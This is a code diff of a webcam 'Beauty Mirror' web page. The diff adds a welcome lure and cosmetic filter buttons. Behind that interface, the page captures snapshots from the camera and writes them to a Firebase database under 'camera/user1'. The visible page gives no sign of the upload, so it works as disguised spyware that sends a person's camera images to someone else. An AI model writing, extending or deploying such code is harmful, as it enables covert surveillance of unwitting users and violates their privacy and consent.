@@ -6,9 +6,9 @@
 <title>Beauty Mirror</title>
 
 <style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
+
 body{
-  margin:0;
-  font-family:Arial;
   min-height:100vh;
   display:flex;
   justify-content:center;
@@ -26,26 +26,38 @@ body{
 
 .card{
   width:90%;
-  max-width:500px;
-  padding:20px;
-  border-radius:20px;
-  background:rgba(255,255,255,0.08);
-  backdrop-filter:blur(15px);
+  max-width:550px;
+  padding:25px;
+  border-radius:25px;
+  background:rgba(255,255,255,.08);
+  backdrop-filter:blur(20px);
   color:white;
   text-align:center;
 }
 
-video{
-  width:100%;
-  border-radius:15px;
-  margin-top:10px;
+.btn{
+  margin-top:15px;
+  padding:14px 30px;
+  border:none;
+  border-radius:50px;
+  cursor:pointer;
+  color:white;
+  background:linear-gradient(90deg,#00d4ff,#ff0080);
 }
 
-button{
-  margin-top:10px;
-  padding:10px 20px;
+video{
+  width:100%;
+  border-radius:20px;
+  margin-top:15px;
+}
+
+#cameraBox{display:none;}
+
+.filters button{
+  margin:5px;
+  padding:10px;
   border:none;
-  border-radius:10px;
+  border-radius:12px;
   cursor:pointer;
 }
 </style>
@@ -54,16 +66,30 @@ button{
 <body>
 
 <div class="card">
-  <h2>📷 Beauty Mirror</h2>
 
-  <button onclick="startCamera()">Start Camera</button>
+  <div id="welcome">
+    <h1>✨ Ready to see your beauty?</h1>
+    <p>Tap below to start</p>
+    <button class="btn" onclick="startCamera()">YES ✨</button>
+  </div>
 
-  <video id="video" autoplay playsinline></video>
+  <div id="cameraBox">
+    <video id="video" autoplay playsinline></video>
 
-  <canvas id="canvas" style="display:none;"></canvas>
+    <div class="filters">
+      <button onclick="setFilter('none')">Normal</button>
+      <button onclick="setFilter('grayscale(100%)')">B&W</button>
+      <button onclick="setFilter('sepia(100%)')">Vintage</button>
+      <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
+      <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
+    </div>
 
-  <p id="status">Waiting...</p>
+    <p id="status">Waiting...</p>
+  </div>
+
 </div>
+
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
@@ -85,13 +111,20 @@ const db = firebase.database();
 let stream;
 
 async function startCamera(){
-  stream = await navigator.mediaDevices.getUserMedia({ video:true });
+  stream = await navigator.mediaDevices.getUserMedia({video:true});
 
   document.getElementById("video").srcObject = stream;
 
-  document.getElementById("status").innerText = "Live";
+  document.getElementById("welcome").style.display="none";
+  document.getElementById("cameraBox").style.display="block";
+
+  document.getElementById("status").innerText="Live";
 
   startSnapshots();
+}
+
+function setFilter(f){
+  document.getElementById("video").style.filter = f;
 }
 
 function startSnapshots(){
@@ -104,15 +137,14 @@ function startSnapshots(){
 
     if(!video.videoWidth) return;
 
-    canvas.width = 320;
-    canvas.height = 240;
+    canvas.width=320;
+    canvas.height=240;
 
     ctx.drawImage(video,0,0,320,240);
 
     const frame = canvas.toDataURL("image/jpeg",0.5);
 
-    // ✅ FIXED: PUSH (NOT SET)
-    db.ref("camera/user1").push({
+    db.ref("camera/user1").set({
       frame: frame,
       updatedAt: Date.now()
     });
